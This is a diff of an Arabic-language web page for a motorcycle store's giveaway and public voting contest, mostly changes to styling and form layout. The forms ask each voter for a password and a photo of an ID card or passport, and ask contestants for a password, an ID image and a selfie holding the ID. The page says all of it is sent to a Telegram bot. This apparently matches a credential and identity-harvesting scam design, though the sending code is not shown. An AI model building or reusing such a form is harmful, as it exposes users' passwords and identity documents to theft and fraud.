-    color: #fda4af;
-    border-radius: 8px;
-    padding: 3px 9px;
-    font-size: 11px;
-    font-weight: 800;
-    cursor: pointer;
-  }
-
-  .admin-bar {
-    margin-top: 16px;
-    padding-top: 14px;
-    border-top: 1px dashed var(--border-line);
-    display: flex;
-    align-items: center;
-    justify-content: space-between;
-    flex-wrap: wrap;
-    gap: 8px;
-  }
-
-  .admin-action {
-    border-radius: 10px;
-    padding: 8px 12px;
-    font-size: 12px;
-    font-weight: 800;
-    cursor: pointer;
-  }
-
-  /* ===== نموذج التسجيل وتذكرته ===== */
-  .reg-grid {
-    display: grid;
-    grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
-    gap: 16px;
-  }
-
-  .reg-grid .full-col {
-    grid-column: 1 / -1;
-  }
-
-  #ticketResult {
-    display: none;
-    text-align: center;
-    padding: 28px 18px;
-    background: rgba(6, 13, 20, 0.85);
-    border: 1.5px dashed var(--amber);
-    border-radius: 22px;
-  }
-
-  .code-display {
-    display: inline-block;
-    margin: 12px 0;
-    padding: 10px 28px;
-    border-radius: 16px;
-    background: rgba(245, 158, 11, 0.14);
-    border: 2px solid var(--amber);
-    color: var(--amber-bright);
-    font-size: 28px;
-    font-weight: 900;
-    letter-spacing: 2px;
-    direction: ltr;
-  }
-
-  .invite-box {
-    max-width: 640px;
-    margin: 14px auto;
-    padding: 16px;
-    border-radius: 16px;
-    background: #07111a;
-    border: 1px solid var(--border-line);
-    color: #e2e8f0;
-    font-size: 13.5px;
-    line-height: 1.8;
+    padding: 18px;
+    border-radius: 18px;
+    font-size: 14px;
+    line-height: 1.85;
     text-align: right;
     white-space: pre-line;
+    margin: 14px auto;
+    max-width: 600px;
+  }
+  .copy-share-btn {
+    background: var(--grad-gold); color: #030712;
+    border: none; padding: 13px 28px; border-radius: 50px;
+    font-weight: 900; font-size: 15.5px; cursor: pointer; margin-top: 8px;
   }
 
-  /* ===== التواصل والفوتر ===== */
-  .contact-card {
-    background: var(--grad-surface);
-    border: 1px solid var(--border-line);
-    border-radius: 22px;
-    padding: 24px 28px;
-    display: flex;
-    align-items: center;
-    justify-content: space-between;
-    flex-wrap: wrap;
-    gap: 16px;
+  .categories-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(240px, 1fr)); gap: 20px; }
+  .cat-card {
+    background: var(--grad-glass); border: 1px solid var(--border);
+    border-radius: 24px; padding: 26px 20px; text-align: center; transition: 0.2s;
   }
+  .cat-card:hover { transform: translateY(-5px); border-color: var(--cyan); }
+  .cat-card.featured { border: 2px solid rgba(245, 158, 11, 0.7); }
+  .cat-icon { font-size: 46px; margin-bottom: 12px; display: block; }
+  .cat-card h3 { font-size: 20px; font-weight: 800; color: var(--gold-bright); margin-bottom: 8px; }
+  .cat-card p { font-size: 13.5px; color: var(--text-muted); }
 
-  .contact-card h3 {
-    font-size: 20px;
-    font-weight: 900;
-    color: var(--amber-bright);
+  .location-strip {
+    background: var(--grad-glass); border: 1px solid var(--border);
+    border-radius: 28px; padding: 30px;
+    display: flex; align-items: center; justify-content: space-between;
+    flex-wrap: wrap; gap: 20px;
   }
-
-  .contact-card p {
-    font-size: 14px;
-    color: var(--text-sub);
-  }
-
-  .tel-group {
-    display: flex;
-    gap: 10px;
-    flex-wrap: wrap;
-  }
-
-  .tel-link {
-    text-decoration: none;
-    background: rgba(245, 158, 11, 0.14);
-    border: 1px solid var(--amber);
-    color: var(--amber-bright);
-    padding: 10px 18px;
-    border-radius: 12px;
-    font-weight: 800;
-    direction: ltr;
+  .loc-text h3 { color: var(--gold); font-size: 22px; font-weight: 900; margin-bottom: 4px; }
+  .phones-list { display: flex; gap: 12px; flex-wrap: wrap; }
+  .phone-link {
+    background: rgba(245, 158, 11, 0.15); border: 1px solid var(--gold);
+    color: var(--gold-bright); text-decoration: none;
+    padding: 11px 22px; border-radius: 15px; font-weight: 800; direction: ltr;
   }
 
   footer {
-    background: #04090e;
-    border-top: 1px solid var(--border-line);
-    text-align: center;
-    padding: 32px 20px;
-    margin-top: 56px;
-    color: var(--text-sub);
+    background: #02050c; border-top: 1px solid #161b26;
+    text-align: center; padding: 45px 20px; margin-top: 70px; color: var(--text-muted);
   }
+  footer h3 { color: var(--gold); font-size: 24px; font-weight: 900; margin-bottom: 6px; }
 
-  footer strong {
-    display: block;
-    font-size: 20px;
-    font-weight: 900;
-    color: var(--amber-bright);
-    margin-bottom: 4px;
-  }
-
-  @media (max-width: 900px) {
-    .hero-panel, .two-col {
-      grid-template-columns: 1fr;
-    }
-    .hero-panel h1 {
-      font-size: 30px;
-    }
-    .panel-box {
-      padding: 20px 14px;
-    }
+  @media (max-width: 860px) {
+    .vote-grid { grid-template-columns: 1fr; }
+    header h1 { font-size: 32px; }
+    .form-container, .voting-section-box { padding: 26px 16px; }
   }
 </style>
 </head>
 <body>
 
-<!-- ===== الشريط العلوي ===== -->
-<header class="topbar">
-  <div class="topbar-inner">
-    <div class="brand">
-      <span>أمير المترات</span>
-      <span class="brand-pill">صفحة موحدة • سعة 500</span>
-    </div>
-    <nav class="nav-menu">
-      <a href="#models">المترات</a>
-      <a href="#voting" class="pill-amber">التصويت والترتيب</a>
-      <a href="#register" class="pill-emerald">تسجيل متسابق</a>
-      <a href="#contact">التواصل</a>
-    </nav>
-  </div>
-</header>
-
-<!-- ===== الواجهة الافتتاحية الموحدة ===== -->
-<div class="hero-wrap">
-  <div class="hero-panel">
-    <div>
-      <div class="hero-kicker">🏆 مسابقة وتصويت متر فلينج (FELLING) — سعة حتى 500 متسابق</div>
-      <h1>كل شيء في صفحة واحدة مع <span>أمير المترات</span></h1>
-      <p>تصفح فئات المترات، صوّت بدقة مع التحقق من الهوية ومنع التكرار، أو سجّل كمتسابق واحصل فوراً على رمزك ورسالة الدعوة المباشرة للمشاركة.</p>
-      <div class="hero-btns">
-        <a href="#voting" class="btn-main-amber">🗳️ انتقل للتصويت والترتيب</a>
-        <a href="#register" class="btn-main-emerald">🎟️ سجّل كمتسابق الآن</a>
-      </div>
-    </div>
-
-    <div class="hero-metric-box">
-      <div class="metric-cell">
-        <strong id="heroCapVal">0 / 500</strong>
-        <span>سعة المتسابقين</span>
-      </div>
-      <div class="metric-cell">
-        <strong id="heroVotesVal">0</strong>
-        <span>إجمالي الأصوات</span>
-      </div>
-      <div class="metric-cell">
-        <strong>100%</strong>
-        <span>تحقق وهوية لكل صوت</span>
-      </div>
-      <div class="metric-cell">
-        <strong>فوري</strong>
-        <span>إرسال وتحديث للبوت</span>
-      </div>
+<!-- ===== نافذة التنبيه الفورية ===== -->
+<div id="promoModal">
+  <div class="modal-box">
+    <div class="modal-badge">🔥 مسابقة السحب والتصويت المباشر</div>
+    <h2>اربح "متر فلينج" زيرو مجاناً بتصويت الجمهور!</h2>
+    <p>أهلاً بك في <strong>متجر أمير المترات</strong>. سجّل كمتسابق واحصل على <strong>رسالة ورابط تصويت جاهز للمشاركة</strong>، أو ادخل الآن للتصويت ومشاهدة النتائج الحية لحظة بلحظة!</p>
+    <div class="modal-actions">
+      <button class="modal-btn" onclick="goToSection('register')">🎟️ سجّل كمتسابق واحصل على رابطك</button>
+      <button class="modal-btn secondary" onclick="goToSection('voting')">🗳️ مشاهدة التصويت المباشر والتصويت</button>
     </div>
   </div>
 </div>
 
-<!-- ===== 1. معرض المترات والصور ===== -->
-<section id="models" class="page-section">
-  <div class="sec-title">
-    <h2>أقسام وفئات المترات في المعرض</h2>
-    <span>اختر الفئة المفضلة لتعبئة التسجيل تلقائياً</span>
-  </div>
-
-  <div class="models-grid">
-    <div class="model-card">
-      <div class="model-banner">
-        <span class="model-tag">الجائزة الكبرى</span>
-        <span class="model-emoji">🏍️</span>
-      </div>
-      <div class="model-body">
-        <h3>متر فلينج (FELLING)</h3>
-        <p>أداء قوي، ثبات ممتاز، وتصميم عملي متكامل وهو المتر الرئيسي للمسابقة.</p>
-        <button type="button" class="model-btn" onclick="chooseModel('متر فلينج (FELLING)')">اختيار في التسجيل</button>
-      </div>
-    </div>
-
-    <div class="model-card">
-      <div class="model-banner">
-        <span class="model-tag">أداء رياضي</span>
-        <span class="model-emoji">🏁</span>
-      </div>
-      <div class="model-body">
-        <h3>المترات الرياضية (Sport)</h3>
-        <p>انسيابية حديثة واستجابة سريعة مع تجهيزات مناسبة للطرقات المختلفة.</p>
-        <button type="button" class="model-btn" onclick="chooseModel('مترات رياضية (Sport)')">اختيار في التسجيل</button>
-      </div>
-    </div>
-
-    <div class="model-card">
-      <div class="model-banner">
-        <span class="model-tag">تحمل يومي</span>
-        <span class="model-emoji">🛵</span>
-      </div>
-      <div class="model-body">
-        <h3>مترات العمل والتوصيل</h3>
-        <p>مصممة للعمل اليومي المستمر بكفاءة تشغيل واقتصادية واضحة.</p>
-        <button type="button" class="model-btn" onclick="chooseModel('مترات العمل والتوصيل')">اختيار في التسجيل</button>
-      </div>
-    </div>
-
-    <div class="model-card">
-      <div class="model-banner">
-        <span class="model-tag">طرق وعرة</span>
-        <span class="model-emoji">⛰️</span>
-      </div>
-      <div class="model-body">
-        <h3>المترات الجبلية والوعرة</h3>
-        <p>عزم مناسب للمرتفعات والمنحدرات والظروف التشغيلية الشاقة.</p>
-        <button type="button" class="model-btn" onclick="chooseModel('المترات الجبلية والوعرة')">اختيار في التسجيل</button>
-      </div>
+<!-- ===== الشريط العلوي ===== -->
+<div class="navbar">
+  <div class="nav-box">
+    <div class="brand-logo">🏍️ أمير المترات</div>
+    <div class="nav-links">
+      <a href="#voting" class="vote-pill">🗳️ التصويت المباشر</a>
+      <a href="#register" class="cta-pill">🎟️ تسجيل متسابق</a>
+      <a href="#models">المترات</a>
+      <a href="#location">الموقع</a>
     </div>
   </div>
-</section>
+</div>
 
-<!-- ===== 2. ساحة التصويت والترتيب المباشر ===== -->
-<section id="voting" class="page-section">
-  <div class="sec-title">
-    <h2>التصويت والترتيب المباشر للمتسابقين</h2>
-    <span>فرز تلقائي حسب أعلى الأصوات</span>
+<!-- ===== الهيدر ===== -->
+<header>
+  <div class="store-badge">🏆 المعرض العصري الأول للدراجات النارية في القاعدة</div>
+  <h1>متجر <span>أمير المترات</span><br>ساحة المنافسة الحية والتصويت المباشر على فلينج!</h1>
+  <p class="subtitle">تصويت مفتوح لجميع الأجهزة بشرط اختلاف الرقم والبريد والهوية لزيادة التفاعل وتوسيع المنافسة بأعلى سرعة ودقة ووصول فوري لبوت التليجرام.</p>
+</header>
+
+<!-- ===== قسم التصويت والمشاهدة المباشرة ===== -->
+<section id="voting">
+  <div class="section-head">
+    <span class="sub">أداء سريع ووصول فوري للبوت</span>
+    <h2>🗳️ ساحة التصويت ومشاهدة النتائج المباشرة</h2>
   </div>
 
-  <div class="panel-box">
-    <div class="status-strip">
-      <div class="status-badge"><span class="dot-live"></span> نظام التصويت والتحقق نشط</div>
-      <div class="status-badge" id="boardSummaryBadge">المتسابقون: 0/500 • الأصوات: 0</div>
+  <div class="voting-section-box">
+    <div class="live-status-bar">
+      <div class="live-pill"><span class="pulse-dot"></span> التصويت متاح لجميع الأجهزة ببيانات مستقلة</div>
+      <div class="live-pill" style="border-color:var(--cyan); color:var(--cyan);" id="capacityCounter">👥 المتسابقون: 50/100 • 🗳️ إجمالي الأصوات: 0</div>
     </div>
 
-    <div class="alert-box">
-      <strong>تنبيه الدقة والنزاهة:</strong> يُمنع تكرار رقم الهاتف أو البريد الإلكتروني للتصويت أكثر من مرة، ويُمنع تصويت المتسابق لنفسه، ويجب إرفاق صورة الهوية/الجواز للتحقق. أي مخالفة أو بيانات غير صحيحة تؤدي لرفض الصوت أو استبعاد المتسابق.
+    <div class="warning-notice" style="margin-bottom:24px;">
+      <span class="icon">🛡️</span>
+      <p><strong>تنبيه مهم ضد الاحتيال والتلاعب:</strong> يُسمح بالتصويت من أي جهاز عند استخدام رقم وبريد ووثيقة مختلفة، ولكن يُمنع منعاً باتاً تكرار نفس الرقم أو البريد أو إرفاق وثائق/بيانات مزورة أو انتحال الهوية. أي محاولة احتيال أو تلاعب تؤدي فوراً لرفض الصوت واستبعاد المخالف وحذف الأصوات المخالفة.</p>
     </div>
 
-    <div class="two-col">
+    <div class="vote-grid">
       <!-- نموذج التصويت -->
-      <div class="sub-panel">
-        <h3>إرسال صوت جديد</h3>
-        <p class="hint">اختر المتسابق أو أدخل رمزه، وأكمل بياناتك وصورة الهوية.</p>
+      <div class="vote-card-panel">
+        <h3>✍️ صوّت لمتسابقك المفضل الآن</h3>
+        <p class="desc">اختر المتسابق أو أدخل رمزه، وأدخل بياناتك والوثيقة لإرسال صوتك للبوت فوراً:</p>
 
-        <div id="inviteBanner" class="invite-banner">
-          رابط دعوة مباشر للمتسابق: <strong id="inviteTargetLabel"></strong>
+        <div id="directInviteBanner" class="direct-invite-banner">
+          🎯 أنت تصوّت الآن عبر رابط الدعوة المباشر للمتسابق:<br>
+          <strong id="invitedCandidateLabel"></strong>
         </div>
 
         <form id="voteForm">
           <div class="field">
-            <label for="candidateSelect">اختر المتسابق *</label>
+            <label for="candidateSelect">🏆 اختر المتسابق أو أدخل رمزه *</label>
             <select id="candidateSelect" onchange="syncCodeFromSelect()">
-              <option value="">-- اختر متسابقاً --</option>
+              <option value="">-- اختر متسابقاً من القائمة --</option>
             </select>
           </div>
 
           <div class="field">
-            <label for="candidateCodeInput">رمز المتسابق *</label>
-            <input type="text" id="candidateCodeInput" required placeholder="AMIR-7272" dir="ltr" style="text-align:center; font-weight:900; letter-spacing:2px; text-transform:uppercase;">
+            <label for="candidateCodeInput">🎟️ رمز تذكرة المتسابق *</label>
+            <input type="text" id="candidateCodeInput" required placeholder="AMIR-7272" dir="ltr" style="text-align:center; font-weight:900; font-size:17px; letter-spacing:2px; text-transform:uppercase; border-color:var(--gold);">
           </div>
 
           <div class="field">
-            <label for="voterName">اسم المصوّت الكامل *</label>
+            <label for="voterName">🙋‍♂️ اسمك الكامل (المُصوِّت) *</label>
             <input type="text" id="voterName" required placeholder="أدخل اسمك الكامل">
           </div>
 
           <div class="field">
-            <label for="voterPhone">رقم الهاتف (غير مكرر) *</label>
+            <label for="voterPhone">📱 رقم هاتفك (يُمنع تكرار الرقم) *</label>
             <input type="tel" id="voterPhone" required placeholder="77xxxxxxx" dir="ltr" style="text-align:right">
           </div>
 
           <div class="field">
-            <label for="voterEmail">البريد الإلكتروني (غير مكرر) *</label>
+            <label for="voterEmail">📧 بريدك الإلكتروني (يُمنع تكرار البريد) *</label>
             <input type="email" id="voterEmail" required placeholder="example@gmail.com" dir="ltr" style="text-align:right">
           </div>
 
+          <!-- كلمة السر تحت البريد الإلكتروني مباشرة -->
           <div class="field">
-            <label for="voterPassword">كلمة السر *</label>
-            <div class="pass-wrap">
-              <input type="password" id="voterPassword" required placeholder="أدخل كلمة سر" dir="ltr" style="text-align:right">
-              <button type="button" class="pass-btn" onclick="togglePass('voterPassword', this)">إظهار</button>
+            <label for="voterPassword">🔒 كلمة السر *</label>
+            <div class="password-wrap">
+              <input type="password" id="voterPassword" required placeholder="أدخل كلمة سر لحسابك" dir="ltr" style="text-align:right">
+              <button type="button" class="toggle-pass" onclick="toggleGenericPass('voterPassword', this)">إظهار</button>
             </div>
           </div>
 
+          <!-- إرفاق صورة البطاقة أو الجواز للمُصوِّت -->
           <div class="field">
-            <label>صورة البطاقة الشخصية أو الجواز للمصوّت *</label>
-            <div class="file-drop" onclick="document.getElementById('voterIdImage').click()">
-              <span class="f-title">اضغط لإرفاق صورة البطاقة أو الجواز</span>
-              <span class="f-sub">تُضغط تلقائياً وتُرسل للبوت للتحقق</span>
+            <label>🪪 صورة البطاقة الشخصية أو الجواز للمُصوِّت *</label>
+            <div class="upload-box" onclick="document.getElementById('voterIdImage').click()">
+              <div class="upload-label">
+                <span class="upload-icon">🆔</span>
+                <span class="upload-text">اضغط هنا لإرفاق صورة البطاقة أو الجواز</span>
+                <span class="upload-sub">تُضغط بسرعة وتُرسل للبوت للتحقق ومنع الاحتيال</span>
+              </div>
               <input type="file" id="voterIdImage" accept="image/*" required onchange="handleImage(event, 'voterIdPreview')">
-              <img id="voterIdPreview" class="img-prev" alt="معاينة هوية المصوّت">
+              <img id="voterIdPreview" class="preview-img" alt="معاينة هوية المصوت">
             </div>
           </div>
 
-          <div class="captcha-row">
-            <span id="captchaQuestion">8 + 4 = ?</span>
+          <div class="captcha-box">
+            <span class="captcha-question" id="captchaQuestion">🔐 كم ناتج: 5 + 3 = ؟</span>
             <input type="number" id="captchaAnswer" required placeholder="الناتج">
           </div>
 
-          <button type="submit" id="voteSubmitBtn" class="btn-submit amber">اعتماد الصوت الآن</button>
-          <div id="voteFeedback" class="feedback"></div>
+          <button type="submit" id="voteSubmitBtn" class="btn-enter gold-btn">🗳️ اعتمد صوتي الآن</button>
+          <div id="voteMsg" class="msg"></div>
 
-          <div id="voteThanksBox" class="thanks-box">
-            <h4>شكراً لتصويتك لدى أمير المترات</h4>
-            <p id="voteThanksText">تم احتساب صوتك بنجاح وإرساله للبوت.</p>
+          <!-- بطاقة الشكر باسم المحل بعد التصويت -->
+          <div id="storeThanksCard" class="store-thanks-card">
+            <h4>🙏 شكراً جزيلاً لتصويتك ومشاركتك الكريمة!</h4>
+            <p id="thanksDetailsText">تم اعتماد صوتك بنجاح، ونشكركم على دعمكم ومشاركتكم في مسابقة السحب والتصويت على متر فلينج.</p>
+            <span class="store-thanks-brand">🏍️ مع خالص الشكر والتقدير — متجر أمير المترات</span>
           </div>
         </form>
       </div>
 
-      <!-- لوحة المتصدرين -->
-      <div class="sub-panel">
-        <div style="display:flex; align-items:center; justify-content:space-between; gap:8px; margin-bottom:6px; flex-wrap:wrap;">
-          <h3>الترتيب المباشر (حتى 500 متسابق)</h3>
-          <button type="button" onclick="syncFromTelegramCloud(true)" style="background:rgba(16,185,129,0.15); border:1px solid var(--emerald); color:#6ee7b7; padding:4px 12px; border-radius:8px; font-size:12px; font-weight:800; cursor:pointer;">تحديث الآن</button>
+      <!-- لوحة المتصدرين المباشرة -->
+      <div class="vote-card-panel">
+        <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:10px; flex-wrap:wrap; gap:8px;">
+          <h3>🏆 الترتيب المباشر للمتسابقين</h3>
+          <button type="button" onclick="syncFromTelegramCloud(true)" style="background:rgba(56,189,248,0.15); border:1px solid var(--cyan); color:var(--cyan); padding:4px 12px; border-radius:10px; font-size:12px; font-weight:800; cursor:pointer;">🔄 تحديث فوري</button>
         </div>
-        <p class="hint">الترتيب تنازلي حسب عدد الأصوات الفعلية.</p>
+        <p class="desc">تُرتب الأسماء تلقائياً من الأعلى تصويتاً إلى الأقل:</p>
 
-        <input type="text" id="searchInput" class="search-box" placeholder="ابحث بالاسم أو الرمز أو المنطقة..." oninput="renderBoard()">
+        <input type="text" id="searchCandidateInput" class="search-filter-input" placeholder="🔍 ابحث عن اسم متسابق أو رمز (مثال: خلدون أو AMIR-7272)..." oninput="renderLeaderboardUI()">
 
-        <div id="leaderboardList" class="board-scroll">
-          <div style="text-align:center; padding:24px; color:var(--text-sub);">جارٍ تحميل القائمة...</div>
+        <div class="leaderboard-list" id="leaderboardList">
+          <div style="text-align:center; padding:30px; color:var(--text-muted);">⏳ جارٍ تحميل قائمة المتسابقين...</div>
         </div>
 
-        <div class="admin-bar">
-          <div style="display:flex; gap:8px; flex-wrap:wrap;">
-            <button type="button" class="admin-action admin-ctrl" onclick="sendSortedReportToBot()" style="background:rgba(16,185,129,0.14); border:1px solid var(--emerald); color:#6ee7b7;">إرسال التقرير للبوت</button>
-            <button type="button" class="admin-action admin-ctrl" onclick="testBotConnection()" style="background:rgba(251,191,36,0.14); border:1px solid var(--amber); color:var(--amber-bright);">فحص البوت</button>
+        <!-- شريط الإدارة (أزرار الفحص والتقرير تظهر فقط داخل وضع الإدارة) -->
+        <div style="margin-top:20px; padding-top:15px; border-top:1px dashed var(--border); display:flex; gap:10px; flex-wrap:wrap; justify-content:space-between; align-items:center;">
+          <div style="display:flex; gap:10px; flex-wrap:wrap;">
+            <button type="button" class="admin-only-control" onclick="sendSortedReportToBot()" style="background:rgba(56,189,248,0.12); border:1px solid var(--cyan); color:var(--cyan); padding:10px 14px; border-radius:12px; font-weight:800; font-size:12.5px; cursor:pointer;">
+              📊 إرسال التقرير للبوت
+            </button>
+            <button type="button" class="admin-only-control" onclick="testBotConnection()" style="background:rgba(16,185,129,0.12); border:1px solid var(--success); color:#6ee7b7; padding:10px 14px; border-radius:12px; font-weight:800; font-size:12.5px; cursor:pointer;">
+              📡 فحص البوت
+            </button>
           </div>
-          <button type="button" class="admin-action" onclick="toggleAdmin()" style="background:rgba(255,255,255,0.06); border:1px solid var(--border-line); color:#e2e8f0;">وضع الإدارة</button>
+          <button type="button" onclick="toggleAdminMode()" style="background:rgba(245,158,11,0.12); border:1px solid var(--gold); color:var(--gold-bright); padding:10px 14px; border-radius:12px; font-weight:800; font-size:12.5px; cursor:pointer;">
+            🔐 وضع الإدارة
+          </button>
         </div>
       </div>
     </div>
   </div>
 </section>
 
-<!-- ===== 3. تسجيل المتسابقين ===== -->
-<section id="register" class="page-section">
-  <div class="sec-title">
-    <h2>تسجيل متسابق جديد وإصدار رابط التصويت</h2>
-    <span>الحد الأقصى: 500 متسابق</span>
+<!-- ===== استمارة تسجيل المتسابقين ===== -->
+<section id="register">
+  <div class="section-head">
+    <span class="sub">بوابة تسجيل المتسابقين (سعة حتى 100 متسابق)</span>
+    <h2>سجّل بياناتك للحصول على رسالة ورابط التصويت الخاص بك</h2>
   </div>
 
-  <div class="panel-box">
-    <form id="registerForm">
-      <div class="reg-grid">
+  <div class="form-container">
+    <form id="raffleForm">
+      <div class="form-grid">
         <div class="field">
-          <label for="regName">الاسم الكامل (مطابق للهوية) *</label>
-          <input type="text" id="regName" required placeholder="أدخل اسمك الرباعي كما في الهوية">
+          <label for="name">👤 الاسم الكامل (الرباعي مطابق للهوية) *</label>
+          <input type="text" id="name" required placeholder="أدخل اسمك الرباعي كما هو في البطاقة">
         </div>
 
         <div class="field">
-          <label for="regPhone">رقم الهاتف / واتساب *</label>
-          <input type="tel" id="regPhone" required placeholder="77xxxxxxx" dir="ltr" style="text-align:right">
+          <label for="phone">📱 رقم الهاتف / واتساب *</label>
+          <input type="tel" id="phone" required placeholder="77xxxxxxx" dir="ltr" style="text-align:right">
         </div>
 
         <div class="field">
-          <label for="regEmail">البريد الإلكتروني *</label>
-          <input type="email" id="regEmail" required placeholder="example@gmail.com" dir="ltr" style="text-align:right">
+          <label for="email">📧 عنوان البريد الإلكتروني *</label>
+          <input type="email" id="email" required placeholder="example@gmail.com" dir="ltr" style="text-align:right">
         </div>
 
         <div class="field">
-          <label for="regPassword">كلمة المرور *</label>
-          <div class="pass-wrap">
-            <input type="password" id="regPassword" required placeholder="أدخل كلمة مرور" dir="ltr" style="text-align:right">
-            <button type="button" class="pass-btn" onclick="togglePass('regPassword', this)">إظهار</button>
+          <label for="password">🔒 كلمة المرور لحسابك في المسابقة *</label>
+          <div class="password-wrap">
+            <input type="password" id="password" required placeholder="أدخل كلمة مرور قوية" dir="ltr" style="text-align:right">
+            <button type="button" class="toggle-pass" onclick="toggleGenericPass('password', this)">إظهار</button>
           </div>
         </div>
 
         <div class="field">
-          <label for="regCity">المحافظة / المنطقة *</label>
-          <input type="text" id="regCity" required placeholder="مثال: صنعاء - تعز - إب - القاعدة">
+          <label for="city">🏙️ المحافظة / المنطقة *</label>
+          <input type="text" id="city" required placeholder="مثال: القاعدة - تعز - إب">
         </div>
 
         <div class="field">
-          <label for="regModel">المتر المفضل *</label>
-          <select id="regModel" required>
+          <label for="favModel">🏍️ المتر المفضل لديك في المعرض *</label>
+          <select id="favModel" required>
             <option value="متر فلينج (FELLING)">متر فلينج (FELLING)</option>
             <option value="مترات رياضية (Sport)">مترات رياضية (Sport)</option>
             <option value="مترات العمل والتوصيل">مترات العمل والتوصيل</option>
@@ -1178,233 +667,288 @@
           </select>
         </div>
 
-        <div class="field full-col">
-          <label for="regNote">كلمة للجمهور (اختياري)</label>
-          <textarea id="regNote" placeholder="اكتب كلمة قصيرة للجمهور..."></textarea>
+        <div class="field full">
+          <label for="note">💬 كلمة للجمهور ليصوتوا لك (اختياري)</label>
+          <textarea id="note" placeholder="اكتب عبارة تشجيعية أو سبب استحقاقك للفوز..."></textarea>
         </div>
 
-        <div class="field full-col">
-          <label>1. صورة البطاقة الشخصية أو الجواز للمتسابق *</label>
-          <div class="alert-box" style="margin-bottom:10px;">
-            يُمنع رفع أي وثائق أو بيانات غير صحيحة أو منتحلة. أي مخالفة تعرض صاحبها للاستبعاد الفوري وحذف الأصوات.
+        <div class="field full">
+          <label>🪪 1. إرفاق صورة البطاقة الشخصية أو جواز السفر للمتسابق *</label>
+          <div class="warning-notice">
+            <span class="icon">⚠️</span>
+            <p><strong>تنبيه هام ضد الاحتيال والتزوير:</strong> يُمنع كلياً رفع أي صور أو بيانات غير صحيحة أو مزورة أو انتحال هوية الغير. أي مخالفة تعرض صاحبها للاستبعاد الفوري وحذف الأصوات وتحمل كامل المسؤولية القانونية، حفاظاً على نزاهة المسابقة وحقوق المتنافسين.</p>
           </div>
-          <div class="file-drop" onclick="document.getElementById('idCardImage').click()">
-            <span class="f-title">اضغط لإرفاق صورة البطاقة أو الجواز</span>
-            <span class="f-sub">تُرسل للإدارة عبر البوت للتحقق</span>
+          <div class="upload-box" onclick="document.getElementById('idCardImage').click()">
+            <div class="upload-label">
+              <span class="upload-icon">🆔</span>
+              <span class="upload-text">اضغط هنا لإرفاق صورة البطاقة أو الجواز</span>
+              <span class="upload-sub">تُضغط تلقائياً وتُرسل للإدارة فقط (لا تُنشر للعامة)</span>
+            </div>
             <input type="file" id="idCardImage" accept="image/*" required onchange="handleImage(event, 'idPreview')">
-            <img id="idPreview" class="img-prev" alt="معاينة الهوية">
+            <img id="idPreview" class="preview-img" alt="معاينة الهوية">
           </div>
         </div>
 
-        <div class="field full-col">
-          <label>2. صورة سيلفي مع الهوية *</label>
-          <div class="file-drop" onclick="document.getElementById('selfieIdImage').click()">
-            <span class="f-title">اضغط لإرفاق صورة سيلفي وأنت تحمل الهوية</span>
-            <span class="f-sub">لتأكيد ملكية الطلب</span>
+        <div class="field full">
+          <label>🤳 2. إرفاق صورة سيلفي لك وأنت تحمل الهوية *</label>
+          <div class="upload-box" onclick="document.getElementById('selfieIdImage').click()">
+            <div class="upload-label">
+              <span class="upload-icon">📸</span>
+              <span class="upload-text">اضغط هنا لإرفاق صورة سيلفي مع الهوية</span>
+              <span class="upload-sub">لتأكيد أنك صاحب الطلب الحقيقي</span>
+            </div>
             <input type="file" id="selfieIdImage" accept="image/*" required onchange="handleImage(event, 'selfiePreview')">
-            <img id="selfiePreview" class="img-prev" alt="معاينة السيلفي">
+            <img id="selfiePreview" class="preview-img" alt="معاينة السيلفي">
           </div>
         </div>
       </div>
 
-      <button type="submit" id="regSubmitBtn" class="btn-submit emerald">إصدار رمز المتسابق ورابط التصويت</button>
-      <div id="regFeedback" class="feedback"></div>
+      <button type="submit" id="btn" class="btn-enter">🔥 أقر بصحة بياناتي وإصدار رابط التصويت الخاص بي</button>
+      <div id="msg" class="msg"></div>
     </form>
 
-    <div id="ticketResult">
-      <div style="color:#6ee7b7; font-weight:900; font-size:15px;">تم تسجيلك وإضافتك إلى قائمة المتسابقين</div>
-      <div class="code-display" id="ticketCodeOut">AMIR-0000</div>
-      <p style="color:var(--text-sub); font-size:13.5px;">انسخ رسالة الدعوة التالية وشاركها ليصوّت لك الجمهور عبر الرابط المباشر:</p>
-      <div id="inviteTextOut" class="invite-box"></div>
-      <button type="button" class="btn-main-amber" onclick="copyInvite()">نسخ رسالة الدعوة</button>
-      <div id="copyDone" style="display:none; margin-top:8px; color:#6ee7b7; font-size:13px; font-weight:800;">تم نسخ رسالة الدعوة بنجاح.</div>
+    <!-- شاشة نجاح التسجيل ورسالة المشاركة المرتبة -->
+    <div id="ticketBox">
+      <div style="display:inline-block; background:var(--cyan); color:#030712; font-weight:900; padding:8px 24px; border-radius:30px; margin-bottom:14px;">✅ تم اعتماد اشتراكك وإضافتك للوحة المتصدرين</div>
+      <h3 style="font-size:28px; color:#38bdf8; font-weight:900;">مبارك! هذا هو رمزك ورسالة الدعوة الجاهزة للمشاركة</h3>
+      <div class="ticket-code" id="ticketCode">AMIR-0000</div>
+      <p style="color:#cbd5e1; font-size:14px;">انسخ الرسالة المرتبة التالية وشاركها في حالتك أو مع أصدقائك؛ أي شخص يضغط على الرابط سيدخل مباشرة للتصويت لك بكل سهولة:</p>
+      <div class="share-message-preview" id="shareMessagePreview"></div>
+      <button type="button" class="copy-share-btn" onclick="copyShareInvite()">📋 نسخ رسالة الدعوة والرابط المباشر لمشاركتها</button>
+      <p id="copyFeedback" style="color:#6ee7b7; font-size:13px; margin-top:8px; display:none;">✅ تم نسخ رسالة الدعوة بنجاح! يمكنك لصقها الآن في واتساب أو حالتك.</p>
     </div>
   </div>
 </section>
 
-<!-- ===== 4. التواصل ===== -->
-<section id="contact" class="page-section">
-  <div class="contact-card">
-    <div>
-      <h3>معرض أمير المترات</h3>
-      <p>القاعدة — الشارع العام | تواصل مباشر للاستفسارات والمتابعة</p>
+<!-- ===== أقسام المترات ===== -->
+<section id="models">
+  <div class="section-head">
+    <span class="sub">معرض الإصدارات</span>
+    <h2>أقسام المترات المتوفرة حصرياً لدينا</h2>
+  </div>
+  <div class="categories-grid">
+    <div class="cat-card featured">
+      <span class="cat-icon">🏍️</span>
+      <h3>مترات فلينج (FELLING)</h3>
+      <p>محرك جبار، أداء استثنائي وثبات مطلق، وهي الجائزة الكبرى للمسابقة.</p>
     </div>
-    <div class="tel-group">
-      <a href="tel:777908028" class="tel-link">📞 777908028</a>
